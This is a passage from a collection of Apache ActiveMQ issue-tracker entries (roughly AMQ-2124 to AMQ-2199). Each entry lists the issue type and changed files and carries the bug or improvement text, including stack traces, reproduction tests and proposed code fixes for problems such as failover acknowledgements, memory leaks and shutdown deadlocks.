org.apache.activemq.broker.region.DurableTopicSubscription.activate(DurableTopicSubscription.java:130)    at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:105)    at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:376)    at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)    at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)    at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:83)    at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:86)    at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:93)    at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:546)    at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308)    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)    at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104)    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)    at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:204)    at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)    at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)    at java.lang.Thread.run(Thread.java:595)    Caused by: java.lang.RuntimeException: java.lang.IllegalStateException: Message id ID:pdrhas4_32-40202-1234575036513-14:8:1:1:3 could not be recovered from the data store - already dispatched    at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:239)    at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:101)    ... 22 more    Caused by: java.lang.IllegalStateException: Message id ID:pdrhas4_32-40202-1234575036513-14:8:1:1:3 could not be recovered from the data store - already dispatched    at org.apache.activemq.store.amq.RecoveryListenerAdapter.recoverMessageReference(RecoveryListenerAdapter.java:58)    at org.apache.activemq.store.kahadaptor.KahaReferenceStore.recoverReference(KahaReferenceStore.java:82)    at org.apache.activemq.store.kahadaptor.KahaTopicReferenceStore.recoverNextMessages(KahaTopicReferenceStore.java:262)    at org.apache.activemq.store.amq.AMQTopicMessageStore.recoverNextMessages(AMQTopicMessageStore.java:59)    at org.apache.activemq.broker.region.cursors.TopicStorePrefetch.doFillBatch(TopicStorePrefetch.java:91)    at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:236)    ... 23 more    « Hide details
issueID:AMQ-2124
type:Improvement
changed files:
texts:Upgrade Camel
Upgrade to version 1.6
issueID:AMQ-2125
type:Bug
changed files:PrefetchSubscription.java
texts:javax.jms.JMSException: Could not correlate acknowledgment with dispatched message thrown on failover
When failing over to a new broker we see this exception. Although the exception is thrown no messages seem to be lost.This can be reproduced using the following unit test and this setup:1. Create two activemq"s using the same datasource.2. Run the test3. Kill the first active mq before the test completes (after you see the first Recieved Message... in the system out)4. See the exception thrown in the second activemq logimport org.apache.activemq.ActiveMQConnectionFactory;import javax.jms.*;import static javax.jms.Session.AUTO_ACKNOWLEDGE;import static javax.jms.Session.SESSION_TRANSACTED;import junit.framework.TestCase;import java.util.concurrent.atomic.AtomicInteger;public class BrokerTest extends TestCase {    public void testFoo() throws Exception {        ConnectionFactory connectionFactory = new ActiveMQConnectionFactory("failover:(tcp://localhost:61616,tcp://localhost:61617)");        Connection connection = connectionFactory.createConnection();        connection.start();        Session producerSession = connection.createSession(false, AUTO_ACKNOWLEDGE);        MessageProducer producer = producerSession.createProducer(producerSession.createQueue("testQueue"));        for (int i = 0; i < 100; i++) {            System.out.println("Sending messages");            producer.send(producerSession.createTextMessage("Hello"));        }        final AtomicInteger atomicInteger = new AtomicInteger(0);        final Session consumerSession = connection.createSession(true, SESSION_TRANSACTED);        MessageConsumer messageConsumer = consumerSession.createConsumer(consumerSession.createQueue("testQueue"));        messageConsumer.setMessageListener(new MessageListener() {            public void onMessage(Message message) {                try {                    System.out.println("Received Message" + message);                    Thread.sleep(1000);                    atomicInteger.addAndGet(1);                    System.out.println(atomicInteger.get());                    consumerSession.commit();                } catch (Exception e) {                    throw new RuntimeException("Oh dear", e);                }            }        });        Thread.sleep(2 * 60 * 1000);        assertEquals(100, atomicInteger.get());    }}
issueID:AMQ-2128
type:Bug
changed files:ActiveMQManagedConnection.java
texts:close() from MessageListener.onMessage() with AUTO or DUPS_OK ack mode should acknowedge messages
With client ack mode, the message will remain unacked if it was not acked before the close. With auto_ack or dups_ok mode, the close() will delivery an ack for all delivered messages, including the message that caused the onMessage call.code from acrivemq-core test org.apache.activemq.JMSConsumerTest:       consumer.setMessageListener(new MessageListener() {            public void onMessage(Message m) {                try {                    TextMessage tm = (TextMessage)m;                    LOG.info("Got in first listener: " + tm.getText());                    assertEquals("" + counter.get(), tm.getText());                    counter.incrementAndGet();                    if (counter.get() == 2) {                        sendDone.await();                        connection.close();                        got2Done.countDown();                    }
issueID:AMQ-2130
type:Improvement
changed files:
texts:upgrade to Camel 2.0
None
issueID:AMQ-2131
type:Improvement
changed files:
texts:integrate the Camel Web console to the ActiveMQ broker
for more background to the console see: http://camel.apache.org/web-console.html
issueID:AMQ-2134
type:Bug
changed files:UdpTransportFactory.java
texts:Multicast transport does not work when for a consumer or producer
I am creating a broker with just a multicast transport connector. Code snippet below.            try{   broker = new BrokerService();  // configure the broker   broker.setBrokerName("ism");     broker.addConnector("multicast://224.1.2.3:6255?loopBackMode=true");      broker.start();  }catch(Exception ex){   ex.printStackTrace();  }Now I try creating a subscriber on the broker  using the following broker url "multicast://224.1.2.3:6255?loopBackMode=true&trace=true"The connection never succeeds and the following message is repeatedly thrown.DEBUG o.a.a.t.reliable.ReliableTransport - Still waiting for response on: multicast://224.1.2.3:6255?loopBackMode=true&trace=true@0 to command: ConnectionInfo {commandId = 1, responseRequired = true, connectionId = ID:JMATHAIY-WXP01-3697-1235159811727-2:0, clientId = ID:JMATHAIY-WXP01-3697-1235159811727-3:0, userName = null, password = null, brokerPath = null, brokerMasterConnector = false, manageable = true, clientMaster = true} sending replay message11:58:44.270 &#91;http-8080-1&#93; DEBUG o.a.a.t.TransportLogger.Connection:1 - SENDING: ReplayCommand {commandId = 25, firstNakNumber = 1, lastNakNumber = 1}The reason to believe why this is a bug: I did some sniffing on the network and found that the igmp multicast join request for the broker never came through. Some digging into the code revealed that the MulticastTransport was never created in the first place. UdpTransport was being created even though the transport was multicast. The following change in the doBind method on the UdpTransportFactory.java fixed this problem.            //int port = location.getPort();            //OpenWireFormat openWireFormat = asOpenWireFormat(wf);            //UdpTransport transport = new UdpTransport(openWireFormat, port);            log.debug("Putting a custom fix for Multicast problem");            UdpTransport transport = (UdpTransport)createTransport(location, wf);Now I was able to see the broker joining the multicast group, but the multicast socket gets timed out after every 5000 ms . I figured out that this is a default setting in the MulticastTransport.java (DEFAULT_IDLE_TIME) and tried changing it to 0 (open socket forever). Note : There is no way to specify this value from the uri. (or I was not able to figure that out).After the above two changes, I could get publisher and consumer connect to the broker and pass on the messages.Please review the above changes and let me know if this has any other side effects or if any better fix is possible.Background : We are actively testing out the various transports to use ActiveMQ in our application and multicast is very essential. Infact we want to integrate jgroups and I am not having any success there. Is jgroups really integrated in 5.2 ?
issueID:AMQ-2143
type:Bug
changed files:DataFileAppender.java
texts:Memoryleak when consuming messages from KahaDBStore
full discription from user list: Memoryleak when consuming messages from KahaDBStore - http://www.nabble.com/Memoryleak-when-consuming-messages-from-KahaDBStore-td21991929.html#a22141262Analysis of perf test  from activemq-core using KahaDB under yourkit demonstrates the issue also.
issueID:AMQ-2144
type:Bug
changed files:
texts:Can&#39;t unsubscribe a durable subscription when there&#39;s a virtual topic present on the broker
The scenario is:There"s a virtual topic being used. (i.e. topic VirtualTopic.Orders).A consumer subscribes to any topic present on the broker and after some time it tries to unsubscribe the durable subscription.When it calls session.unsubscribe(consumerName) to unsubscribe a durable subscription, it receives the following exception:Caught: javax.jms.JMSException: org.apache.activemq.broker.region.virtual.VirtualTopicInterceptor cannot be cast to org.apache.activemq.broker.region.Topicjavax.jms.JMSException: org.apache.activemq.broker.region.virtual.VirtualTopicInterceptor cannot be cast to org.apache.activemq.broker.region.Topic at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1244) at org.apache.activemq.ActiveMQConnection.unsubscribe(ActiveMQConnection.java:2052) at org.apache.activemq.ActiveMQSession.unsubscribe(ActiveMQSession.java:1431) at DurableSubscriber.consumeMessagesAndClose(DurableSubscriber.java:206) at DurableSubscriber.run(DurableSubscriber.java:112) at DurableSubscriber.main(DurableSubscriber.java:70)Caused by: java.lang.ClassCastException: org.apache.activemq.broker.region.virtual.VirtualTopicInterceptor cannot be cast to org.apache.activemq.broker.region.Topic at org.apache.activemq.broker.region.TopicRegion.removeSubscription(TopicRegion.java:139) at org.apache.activemq.broker.region.RegionBroker.removeSubscription(RegionBroker.java:409) at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:98) at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:98) at org.apache.activemq.broker.BrokerFilter.removeSubscription(BrokerFilter.java:98) at org.apache.activemq.broker.MutableBrokerFilter.removeSubscription(MutableBrokerFilter.java:105) at org.apache.activemq.broker.TransportConnection.processRemoveSubscription(TransportConnection.java:339) at org.apache.activemq.command.RemoveSubscriptionInfo.visit(RemoveSubscriptionInfo.java:83) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:143) at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:206) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185) at java.lang.Thread.run(Thread.java:619)The error happens on the following method of org.apache.activemq.broker.region.TopicRegion class:    public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info) throws Exception {        SubscriptionKey key = new SubscriptionKey(info.getClientId(), info.getSubscriptionName());        DurableTopicSubscription sub = durableSubscriptions.get(key);        if (sub == null) {            throw new InvalidDestinationException("No durable subscription exists for: " + info.getSubscriptionName());        }        if (sub.isActive()) {            throw new JMSException("Durable consumer is in use");        }        durableSubscriptions.remove(key);        synchronized (destinationsMutex) {            for (Iterator<Destination> iter = destinations.values().iterator(); iter.hasNext() {                Topic topic = (Topic)iter.next();                topic.deleteSubscription(context, key);            }        }        super.removeConsumer(context, sub.getConsumerInfo());    }The virtual topic is present on the destinations collection being iterated but its type is not Topic and that is what causes the error.If there is no virtual topics present on the broker, unsubscriptions work well.
issueID:AMQ-2149
type:Bug
changed files:
texts:Shared Filesystem Master Slave: missing messages
I"m finding occasionally messages are not delivered in order in a shared filesystem master slave setup when the master fails and the slave takes over.  I"m running a simple test on one physical machine where the shared filesystem is on a single disk (no SAN currently involved).I"m attaching a shell script (run_master_slave_brokers.sh) that starts a master and slave broker in the same directory, sleeps 20 seconds, kills the master, sleeps 20 seconds, starts a new slave, sleeps 20 seconds, kills the master, etc.Also attached is a small java test program (MasterSlaveTest.java)  The program starts 10 JMS senders that send 75kb text messages every 25 ms to unique queues.  These messages contain a sequence number header (a long).  The program also starts 10 receivers (1 for each queue) that keep track of the next expected sequence number and validate each incoming sequence number.  If a receiver gets an unexpected sequence number, the test program exits (System.exit(1)).  Both the senders and receivers use the failover transport to connect to the broker.  Messages being sent are persistent, so in theory there should be no message loss when the master fails and slave takes over.I run the script to start the brokers, then run my test program.  Most times when the script kills the master and the slave is promoted, things work fine - the test program reconnects, and messages continue to be delivered in order.  If I run this long enough though, eventually my test program fails just after a slave broker is promoted to master with output similar to this:Mar 6, 2009 11:58:12 AM org.apache.activemq.transport.failover.FailoverTransport doReconnectINFO: Successfully reconnected to tcp://localhost:61616Mar 6, 2009 11:58:12 AM org.aaron.MasterSlaveTest$Receiver onMessageWARNING: test.queue.3 received 630 expected 629This indicates the receiver for test.queue.3 received message 630 after the slave broker took over and missed message 629.This seems to happen more often when more senders and receivers are running and more queues are in use.  If I run a single sender/receiver pair on 1 queue, it is very difficult to make this happen.
issueID:AMQ-2150
type:Bug
changed files:
texts:URL to JIRA is incorrect in the doap.rdf file for ActiveMQ
The URL to JIRA is incorrect in the doap.rdf file since the activemq.org TLD is no longer available. The doap.rdf file is parsed and used by the following site: http://projects.apache.org/projects/activemq.html
issueID:AMQ-2153
type:Bug
changed files:MessageDatabase.java
texts:KahaDB store - deadlock on shutdown
little bit of deadlock between the shutdown and the checkpoint thread."ActiveMQ Journal Checkpoint Worker" prio=5 tid=0x01016f10 nid=0x8dd800 waiting for monitor entry [0xb0d8c000..0xb0d8cd90] at org.apache.activemq.store.kahadb.MessageDatabase.checkpointCleanup(MessageDatabase.java:468) - waiting to lock <0x095ad3e0> (a java.lang.Object) at org.apache.activemq.store.kahadb.MessageDatabase$3.run(MessageDatabase.java:261)"main" prio=5 tid=0x010013b0 nid=0xb0801000 in Object.wait() [0xb07ff000..0xb0800188] at java.lang.Object.wait(Native Method) - waiting on <0x0959f608> (a org.apache.activemq.store.kahadb.MessageDatabase$3) at java.lang.Thread.join(Thread.java:1113) - locked <0x0959f608> (a org.apache.activemq.store.kahadb.MessageDatabase$3) at java.lang.Thread.join(Thread.java:1166) at org.apache.activemq.store.kahadb.MessageDatabase.close(MessageDatabase.java:310) at org.apache.activemq.store.kahadb.MessageDatabase.unload(MessageDatabase.java:327) - locked <0x095ad3e0> (a java.lang.Object) at org.apache.activemq.store.kahadb.MessageDatabase.stop(MessageDatabase.java:173) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:519) at org.apache.activemq.JmsTestSupport.tearDown(JmsTestSupport.java:136) at junit.framework.TestCase.runBare(TestCase.java:130) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:90) at org.apache.activemq.CombinationTestSupport.runBare(CombinationTestSupport.java:96) at junit.framework.TestResult$1.protect(TestResult.java:106) at junit.framework.TestResult.runProtected(TestResult.java:124) at junit.framework.TestResult.run(TestResult.java:109) at junit.framework.TestCase.run(TestCase.java:118) at junit.framework.TestSuite.runTest(TestSuite.java:208) at junit.framework.TestSuite.run(TestSuite.java:203) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.apache.maven.surefire.junit.JUnitTestSet.execute(JUnitTestSet.java:213) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.executeTestSet(AbstractDirectoryTestSuite.java:140) at org.apache.maven.surefire.suite.AbstractDirectoryTestSuite.execute(AbstractDirectoryTestSuite.java:165) at org.apache.maven.surefire.Surefire.run(Surefire.java:107) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at org.apache.maven.surefire.booter.SurefireBooter.runSuitesInProcess(SurefireBooter.java:289) at org.apache.maven.surefire.booter.SurefireBooter.main(SurefireBooter.java:993)
issueID:AMQ-2154
type:Bug
changed files:ActiveMQObjectMessage.java
pom.xml
MessageQuery.java
texts:trying to access an ObjectMessage in the AMQ web console results in java.io.IOException: com.myclass...
The web console can be used to drill into individual message and display both their properties as well as payload. Displaying the payload generally works fine for TextMessages, etc but fails for ObjectMessages and probably other binary payload formats.This is okay and kind of expected but rather than throwing an exception with a large stack trace back to the browser client, we should capture the ex and display at least the message properties and also a short message that the content cannot be displayed due to its binary content.Error msg and stack trace that is thrown:java.io.IOException: com.myclass at org.apache.activemq.command.ActiveMQObjectMessage.getObject(ActiveMQObjectMessage.java:179) at org.apache.activemq.web.MessageQuery.getBody(MessageQuery.java:78) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25) at java.lang.reflect.Method.invoke(Method.java:585) at javax.el.BeanELResolver.getValue(BeanELResolver.java:261) at javax.el.CompositeELResolver.getValue(CompositeELResolver.java:143) at com.sun.el.parser.AstValue.getValue(AstValue.java:138) at com.sun.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:206) at org.apache.jasper.runtime.PageContextImpl.evaluateExpression(PageContextImpl.java:984) at org.apache.jsp.message_jsp._jspx_meth_c_out_0(org.apache.jsp.message_jsp:400) at org.apache.jsp.message_jsp._jspx_meth_c_otherwise_0(org.apache.jsp.message_jsp:334) at org.apache.jsp.message_jsp._jspx_meth_c_choose_0(org.apache.jsp.message_jsp:151) at org.apache.jsp.message_jsp._jspService(org.apache.jsp.message_jsp:92) at org.apache.jasper.runtime.HttpJspBase.service(HttpJspBase.java:93) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:373) at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:477) at org.apache.jasper.servlet.JspServlet.service(JspServlet.java:371) at javax.servlet.http.HttpServlet.service(HttpServlet.java:806) at org.mortbay.jetty.servlet.ServletHolder.handle(ServletHolder.java:487) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1093) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:83) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:76) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at org.apache.activemq.web.SessionFilter.doFilter(SessionFilter.java:46) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at org.apache.activemq.web.filter.ApplicationContextFilter.doFilter(ApplicationContextFilter.java:81) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at com.opensymphony.module.sitemesh.filter.PageFilter.parsePage(PageFilter.java:118) at com.opensymphony.module.sitemesh.filter.PageFilter.doFilter(PageFilter.java:52) at org.mortbay.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1084) at org.mortbay.jetty.servlet.ServletHandler.handle(ServletHandler.java:360) at org.mortbay.jetty.security.SecurityHandler.handle(SecurityHandler.java:216) at org.mortbay.jetty.servlet.SessionHandler.handle(SessionHandler.java:181) at org.mortbay.jetty.handler.ContextHandler.handle(ContextHandler.java:712) at org.mortbay.jetty.webapp.WebAppContext.handle(WebAppContext.java:405) at org.mortbay.jetty.handler.HandlerCollection.handle(HandlerCollection.java:114) at org.mortbay.jetty.handler.HandlerWrapper.handle(HandlerWrapper.java:139) at org.mortbay.jetty.Server.handle(Server.java:324) at org.mortbay.jetty.HttpConnection.handleRequest(HttpConnection.java:506) at org.mortbay.jetty.HttpConnection$RequestHandler.headerComplete(HttpConnection.java:829) at org.mortbay.jetty.HttpParser.parseNext(HttpParser.java:514) at org.mortbay.jetty.HttpParser.parseAvailable(HttpParser.java:211) at org.mortbay.jetty.HttpConnection.handle(HttpConnection.java:381) at org.mortbay.io.nio.SelectChannelEndPoint.run(SelectChannelEndPoint.java:396) at org.mortbay.thread.BoundedThreadPool$PoolThread.run(BoundedThreadPool.java:442)
issueID:AMQ-2158
type:Improvement
changed files:Usage.java
texts:Raise the logging level and improve logging for memory usage changes
Currently the logging for memory usage changes in the Usage.fireEvent() method is restricted to debug output. This should be raised to info level by default and warning level if the memory usage is over a certain threshold, say 80%.
issueID:AMQ-2160
type:Improvement
changed files:
texts:Enable configurable audit window size
Add destination policy we can use to configure duplicate message audit window size (default 2k).
issueID:AMQ-2166
type:Bug
changed files:ManagedSessionProxy.java
ManagedConnectionProxy.java
texts:MemoryLeak in the ResourceAdapter (ManagedConnectionProxy)
The ActiveMQ JCA Resource Adapter leaks about 1Kb of memory when opening and closing sessions on the same connection. As soon as the connection is closed this memory is released, but it"s a common use case to keep the connection for a very long time (ie aquire at startup and relase at shutdown).The leak happens because the ManagedConnectionProxy holds a list of sessions that have been openend, but there"s no code that removes a closed session from the list.
issueID:AMQ-2168
type:Improvement
changed files:
texts:Improve LoggingBrokerPlugin
I was recently involved into analyzing the behavior of the ActiveMQ broker in different scenarios and was thinking that a Logging Plugin would be handy to have. The existing org.apache.activemq.broker.util.LoggingBrokerPlugin simply traces the send of messages.
issueID:AMQ-2169
type:Bug
changed files:
texts:Web Console spawns new threads for every refresh and never kills any
How to reproduce:  Use JMX to look at the threads. Open the web console gui and hit refresh.For every refresh 1-2 new threads are spawned. These are never closed/killed and after a while the broker becomes unresponsive. (For us this happens after about 180-200 threads which corresponds to hitting refresh repeatedly for about one minute.)The threads are named ActiveMQ Session ID:someId and is of type DedicatedTaskRunner.
issueID:AMQ-2171
type:Bug
changed files:
texts:Browse queue hangs with prefetch = 0
Browsing a queue with prefetch = 0 blocks on the first read, see attached test case.
issueID:AMQ-2174
type:Bug
changed files:
texts:Modifying an existing Durable subscription blocks that subscription from receiving messages
When modifying an existing durable subscription, for example to change selectors, that subscription no longer gets any messages and error messages are produced.Juni test case attached and broker output with log level set to TRACE, which is based on the ProducerTool and ConsumerTool examples.Sequence to produce the problem is 1. Clean data directory2. Run test case testConsumeWithNoSelectors - this creates the topic and blocks waiting for messages3. Run test case testProduceWithProperties - this creates 6 messages each with a single String property.  First 2 have "selectorProp = 0", second 2 have value 1 and third pair have value 0 again.  Consumer test case in (2) will consume messages and exit.4. Run test case testConsumeWithSelectors - this changes the durable subscription and adds the selectorProp = "0" to the subscription.5. Run same test case as (3).  The consumer will then receive the first 2 messages produced by this producer and then block as it changes the subscription to have selectorProp = "1".At this point this would appear to be a problem.  According to the JMS TopicSubscriber Javadocs"A client can change an existing durable subscription by creating a durable TopicSubscriber with the same name and a new topic and/or message selector. Changing a durable subscription is equivalent to unsubscribing (deleting) the old one and creating a new one. "so, if step (4) above has now changed the durable subscription to add a selector it still receives the first two messages from step 5, so from that, it appears that the broker is able to recognise this as a modification (although it is delete+create).  So, when it then tried to make the modification to change the selector to "selectorProp = 1" and receive the next two it does not get any messages.  So, I would expect that as it has now blocked waiting for messages with those properties, if I do6. Run same test case as (3)I would expect the middle two messages to be received by the blocked consumer, but no more messages are consumed and I get the following messages to the broker logERROR RecoveryListenerAdapter        - Message id ID:aconcagua-4821-1237761609609-0:0:1:1:3 could not be recovered from the data store - already dispatchedThis particular subscription for clientId and topic now seems to be blocked forever and messages posted to this topic can never be received by this subscriber.
issueID:AMQ-2178
type:Bug
changed files:ConnectionStateTracker.java
texts:Memory leak in ConnectionStateTracker (cannot remove connections, sessions or consumers)
After inspecting the heap dump of our application we saw that the ConcurrentHashMap connectionStates in org.apache.activemq.state.ConnectionStateTracker in org.apache.activemq.transport.failover.FailoverTransport consumes very much heap space.The ConnectionStateTracker is an implementation of a CommandVisitor, but the function to remove connections from the connectionStates ConcurrentHashMap in processRemoveConnection() is never called, as it does not correspond to the CommandVisitor interface. The same applies to the processRemoveConsumer() and processRemoveSession() functions.I attached a patch to fix those bugs and remove the memory leak in ConnectionStateTracker.
issueID:AMQ-2179
type:Bug
changed files:
texts:XPath selector fails to select messages correctly when the expression evaluates to &#39;true&#39;
Currently the XalanXPathEvaluator class will return "true" or "false" based on the existence of a node in the XML document that matches the XPath expression. However, XPath expressions themselves can return values of true or false based on a comparison criteria. For example, for an input message:<root>  <a key="first" num="1"/>  <b key="second" num="2">b</b></root>A consumer using an XPath selector with an expression such as: XPATH "/root/b="b""should successfully select and consume the message above. The evaluator today would attempt to retrieve a XML node with that expression, but it would fail and return false since the returned value of the expression is a Boolean.The XPath Selector should be able to handle Boolean expressions.
issueID:AMQ-2182
type:Bug
changed files:
texts:Camel module test failures
Just as a reminder ... there are test failures in activemq-camel module after upgrading to 2.0target/surefire-reports/org.apache.activemq.camel.component.ActiveMQJmsHeaderRouteTest.txt:Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 3.538 sec <<< FAILURE!target/surefire-reports/org.apache.activemq.camel.component.InvokeRequestReplyUsingJmsReplyToHeaderTest.txt:Tests run: 1, Failures: 0, Errors: 1, Skipped: 0, Time elapsed: 22.466 sec <<< FAILURE!target/surefire-reports/org.apache.activemq.camel.converter.InvokeMessageListenerTest.txt:Tests run: 1, Failures: 1, Errors: 0, Skipped: 0, Time elapsed: 11.559 sec <<< FAILURE!target/surefire-reports/org.apache.activemq.camel.converter.InvokeMessageListenerTest.txt:testSendTextMessage(org.apache.activemq.camel.converter.InvokeMessageListenerTest)  Time elapsed: 11.543 sec  <<< FAILURE!
issueID:AMQ-2183
type:Bug
changed files:
texts:Master/slave out of sync with multiple consumers of a VirtualTopic on the same broker
1. producer of VirtualTopic.testTopic publish message to brokerA2. consumer 1 on brokerB with "Consumer.A.VirtualTopic.testTopic    consumer 2 on brokerB with "Consumer.A2.VirtualTopic.testTopic3. brokerA and brokerB are bridged.Result: you will get ERROR MasterBroker - Slave Failedjavax.jms.JMSException: Slave broker out of sync with master - Message: ID:yhe-1337-1236273055924-0:16:1:1:738 on queue does not exist among pending(0) for subscription: ID:yhe-3603-1236271682179-0:13:1:1Reason:In TransactionBroker.java there is a ActiveMQMessageAudit and it will be configured if the broker is a slave. ActiveMQMessageAudit is using the messageId alone to check whether the message is a duplicate. The message for consumer2 will be ignored as duplicate and not saved to the message store because consumer1"s same message arrives early.
issueID:AMQ-2191
type:Bug
changed files:TransactionContext.java
texts:Incorrect handling of interruptions during commit or rollback of a transaction
We have a process framework that sends interruptions to threads that should be stopped or paused. Some of these threads interact with ActiveMQ, so interruptions can occur inside ActiveMQ at different points.A problem occurs if the interruption is detected in ActiveMQConnection.syncSendPacket during commit or rollback of a transaction. ActiveMQ then throws a JMSException so that it appears to Bitronix as if the XA transaction is in an inconsistent state (see stacktrace in the attached file).In our opinion, the interruption should be ignored by ActiveMQ during the critical commit or rollback phase. It is not mandatory that an interruption has an immediate effect. Especially such a non-interruptable step as rollback or commit should be performed even though an interruption occurs.I created a patch for the class TransactionContext which, in case of an interruption, resets the interruption state of the thread, retries the syncSendPacket method call and restores the thread"s interruption state afterwards. In this manner, no inconsistent state exceptions occur in the transaction manager any longer and interruption is deferred until the commit/rollback has succeeded.
issueID:AMQ-2192
type:Bug
changed files:
texts:Protobuf module fails to build
There are a missing dependency on protobuf-2.0.0-SNAPSHOT, compilation problems and test failures.
issueID:AMQ-2195
type:Bug
changed files:
texts:MessageConsumer.receive() does not throw an exception if the connection to the broker is lost.
If you don"t set an ExceptionListener on the connection to the broker from within your consumer you won"t get any notification if the connection to the broker has been lost, instead MessageConsumer.receive() will only return null or block indefinitely depending on if you use the timeout parameter or not.
issueID:AMQ-2196
type:Bug
changed files:InactivityMonitor.java
texts:InactivityMonitor Issues
InactivityMonitor should not simply use the minimum of the local and remote maxInactivityDuration parameterInactivityMonitor.java uses the following configuration        readCheckTime = Math.min(localWireFormatInfo.getMaxInactivityDuration(), remoteWireFormatInfo.getMaxInactivityDuration());        initialDelayTime =  Math.min(localWireFormatInfo.getMaxInactivityDurationInitalDelay(), remoteWireFormatInfo.getMaxInactivityDurationInitalDelay());Because of this, I can"t simply define a maxInactivityDuration on my JMS server.  I need to make sure that the clients specify a value that is greater then or equal to the server configured value.  CMS doesn"t yet supply this parameter when it makes an openwire connection so in my mixed Java/C++ application environment, I can"t bump the inactivity timeout > 30s (the default).  Why should the server setting for how long to go before timing out a connection be influenced by what the client requests?  Client can always terminate the connection.I suggest that this be changed to        readCheckTime = localWireFormatInfo.getMaxInactivityDuration();        initialDelayTime = localWireFormatInfo.getMaxInactivityDurationInitalDelay();
issueID:AMQ-2198
type:Improvement
changed files:DemandForwardingBridgeSupport.java
texts:Allow suppression of duplicate queue subscriptions in a cyclic network topology
in a cyclic network of brokers (where each broker knows about each other) it is possible to have a cyclic graph and multiple routes across the network. this occurs because some brokers pick up the second order advisories that arise from a broker responding to an advisory from another broker. The result is that a consumer on one broker can manifest itself as multiple consumers on brokers across the network. Network priority gives precedence to the shortest route when it is configured. This enhancement would ensure that there is only one route for a given destination and makes the network more deterministic and a little simpler. With small numbers of brokers in the network, this is often what you want.When topics are involved, the duplication leads to duplicate messages so duplicates for topics are suppressed by default on trunk and will be in 5.3. For queues, as the message goes to just one consumer, there is no duplicate issue, just some indeterminism in how a message is routed through the network. This indeterminism is a means of fault tolerance and can be a good thing so this feature is enabled via configuration for queues.see some more background on the topic case @ https://issues.apache.org/activemq/browse/AMQ-2030
issueID:AMQ-2199
type:Bug
changed files:DemandForwardingBridge.java
DemandForwardingBridgeSupport.java
ConduitBridge.java
texts:NullPointerException during broker start on brokerid
